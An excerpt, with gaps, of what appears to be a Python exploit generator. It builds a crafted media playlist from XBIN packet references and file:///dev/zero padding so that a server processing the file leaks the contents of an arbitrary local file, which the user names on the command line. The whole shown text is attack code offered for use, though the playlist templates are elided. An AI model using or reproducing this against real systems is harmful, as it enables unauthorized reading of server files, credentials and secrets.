...
import string
import struct
from builtins import bytes, map, range, zip
...
def gen_xbin_packet_playlist(filename, offset, packet_size):
    ...
    while packet_size > 0:
        ...
        result.append(
            EXTERNAL_REFERENCE_PLAYLIST.format(size=part_size, offset=offset, filename=filename)
        )
        offset += part_size
...
def gen_xbin_playlist(filename_to_read):
    ...
    next_delta = 5
    for max_offs, filename in ((5000, filename_to_read), (500, "file:///dev/zero")):
        offset = 0
        while offset < max_offs:
            for _ in range(10):
                pls_part, new_offset = gen_xbin_packet_playlist(filename, offset, 0xF0 - next_delta)
                pls.append(pls_part)
                next_delta = 0
            offset = new_offset
        pls.append(SYNC)
    return FULL_PLAYLIST.format(
        content="".join(pls), rand="".join(random.choice(string.ascii_lowercase) for i in range(30))
    )
...
if __name__ == "__main__":
    ...
    parser.add_argument(
        "filename", help='filename to be read from the server (prefix it with "file://")'
    )
